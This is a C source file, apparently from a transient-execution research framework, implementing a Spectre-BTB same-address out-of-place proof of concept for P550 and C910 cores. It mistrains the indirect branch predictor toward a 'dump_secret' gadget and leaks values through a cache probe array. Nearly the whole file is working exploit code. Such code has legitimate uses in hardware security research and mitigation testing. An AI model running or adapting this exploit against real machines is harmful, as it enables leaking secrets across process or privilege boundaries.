#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// BTB sa-oop: Same-address out-of-place indirect branch mistraining
// P550: Uses 64KB alignment + pointer-chase for IJTP collision
// C910: Uses STALL for speculation window extension

uint8_t* probe_array;

#define TRAIN_VALUE 0x01

volatile uint8_t current_encode_value;

typedef void (*target_t)(void);
target_t __attribute__((aligned(4096))) train_table[1024];
target_t __attribute__((aligned(4096))) attack_table[1024];

#ifdef P550
// P550: Pointer chase chains for true data dependency on table address
#define CHAIN_DEPTH 2
ptr_chase_chain_t* train_chain;
ptr_chase_chain_t* attack_chain;
#endif

void __attribute__((noinline)) dump_secret(void) {
    SPEC_FENCE();
    maccess(probe_array + current_encode_value * PAGE_SIZE);
}

void __attribute__((noinline)) dummy(void) {
}

#ifdef P550
// P550: 64KB alignment for IJTP collision + pointer chase for dependency
void __attribute__((noinline, aligned(65536))) train_accessor(int idx) {
    target_t* table = (target_t*)PTR_CHASE_N(train_chain->start, CHAIN_DEPTH);
    table[idx]();
}
void __attribute__((noinline, aligned(65536))) attack_accessor(int idx) {
    target_t* table = (target_t*)PTR_CHASE_N(attack_chain->start, CHAIN_DEPTH);
    table[idx]();
}
#else
// C910: Use STALL to extend speculation window
void __attribute__((noinline)) train_accessor(int idx) {
    train_table[STALL(idx)]();
}
void __attribute__((noinline)) attack_accessor(int idx) {
    attack_table[STALL(idx)]();
}
#endif

void btb_oop_setup(exploit_ctx_t* ctx, void* data) {
    train_table[0] = dump_secret;
    attack_table[0] = dummy;

#ifdef P550
    // Create pointer chase chains (P550 only)
    train_chain = ptr_chase_chain_create(CHAIN_DEPTH, (void*)train_table);
    attack_chain = ptr_chase_chain_create(CHAIN_DEPTH, (void*)attack_table);

    if (!train_chain || !attack_chain) {
        fprintf(stderr, "Failed to create pointer chase chains\n");
        exit(1);
    }
#endif

    ctx->exclude_enabled = true;
    ctx->exclude_value = TRAIN_VALUE;
}

void btb_oop_cleanup(exploit_ctx_t* ctx, void* data) {
#ifdef P550
    ptr_chase_chain_destroy(train_chain);
    ptr_chase_chain_destroy(attack_chain);
#endif
}

void btb_oop_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    for (int m = 0; m < 1500; m++) {
        // Training phase - trains BTB/IJTP with dump_secret target
        current_encode_value = TRAIN_VALUE;
        mfence();
        for (int i = 0; i < 10; i++) {
            train_accessor(0);
        }

        // Attack phase - mispredicts to dump_secret
        current_encode_value = encode_index;
        mfence();
        attack_accessor(0);
    }
}

int main() {
    exploit_ctx_t ctx = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

#ifdef P550
    printf("Spectre-BTB sa-oop (P550, chain_depth=%d)\n", CHAIN_DEPTH);
#else
    printf("Spectre-BTB sa-oop (C910)\n");
#endif

    exploit_hooks_t hooks = {
        .setup   = btb_oop_setup,
        .attack  = btb_oop_attack,
        .cleanup = btb_oop_cleanup
    };

    exploit_run(&ctx, &hooks, NULL);
    exploit_print_results("BTB same-address out-of-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
